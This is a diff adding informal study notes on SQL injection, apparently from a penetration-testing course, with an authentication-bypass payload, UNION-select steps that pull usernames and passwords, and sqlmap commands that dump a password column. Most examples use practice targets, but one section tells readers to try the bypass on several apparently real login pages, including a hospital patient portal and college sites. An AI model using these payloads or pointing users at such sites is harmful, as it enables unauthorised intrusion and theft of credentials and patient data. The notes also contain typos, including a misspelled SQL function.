@@ -1,0 +1,124 @@
+SQL:
+
+What is SQL?
+
+>SQL is Structured Query Language which is used to query data from the database.
+>SQL helps web application in communicating with the database to retrieve or store data from or in the database.
+>Database is a collection of data stored
+ by a website in a particular format. This data could
+ be all the application information like users information,messages,posts,etc.
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>Most websites use a database to store data.
+>Most data stored in it (usernames,passwords,etc)
+>web application reads,updates and inserts data in the database.
+>Interaction with DB done using SQL.
+
+Dangerous:
+
+>They are everywhere
+>Give access to the database (sensitive data)
+>Can be used to log in as admin and further exploit
+ the system.
+>Can be used to upload files.
+
+Discovering SQL Injection:
+
+>Try to break the page
+>using 'and','order by' or "'".
+>Test text boxes and url parameters on the form
+ http://target.com/page.php?something=something
+
+FIRST:
+To show hoe database looks like:
+
+>>mysql -u root -h <metasploitable IP>
+>>show databases;
+>>use owasp10
+>>show tables;
+select * from accounts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+testphp.vulnweb.com
+
+1.SQLI authentication bypass:
+
+select *from users where uname='1'or'1'='1' AND password='1'or'1'='1'
+
+user name: 1'or'1'='1
+password:  1'or'1'='1
+
+>>>>>Try the same on this website:
+
+http://patients.cityhospitalindia.in/login.php
+
+LINK: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+LINK: http://seemantaengg.ac.in/jobfair/login.asp
+LINK: https://www.dbcas.edu.in/edu/online_registration/login.php
+LINK: http://www.bils.co.in/Login.asp
+ 
+
+2.Union select Injection:
+
+Step 1;
+>Browse categories
+>poster
+
+Step 2;
+>in url put ' at last to generate error.
+>from an error we came to know that,there is mysql is running behind the scene.
+
+Step 3;
+Order by:
+ It is used to make the column in sequence
+ i table.
+ (PRACTICAL ON w3school)
+
+>Again in the url try order by ..
+>here we came to know there are 11 columns
+
+Step 4;
+To find the Vulnerable column:
+>union select 1,2,3,4,5,6,7,8,9,10,11
+7,2,9 columns are reflecting it means they are vulnerable
+>union select 1,database(),3,4,5,6,7,8,9,10,11
+>union select 1,databse(),3,4,5,6,version(),8,9,10,11  
+                   
+Step 5;
+To find table names:
+
+>union select 1,2,3,4,5,6,table_name,8,9,10,11 from information_schema.tables where table_schema='acuart'
+
+Step 6;
+listing column names:
+>union select 1,2,3,4,5,6,column_name,8,9,10,11 from information_schema.columns where table_name='users'
+
+Step 7;
+fetching the data:
+union select 1,pass,3,4,5,6,uname,8,9,10,11 from users
+
+https://www.amanhardikar.com/mindmaps.html
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+TOOL:
+
+SQLMAP:
+>It is designed to exploit sql injections.
+>works with many db types,mysql,mssql,oracle,etc
+
+Step 1:
+
+>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns
+>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C pass --dump
+
+
+
+
+sql queries:
+
+https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+
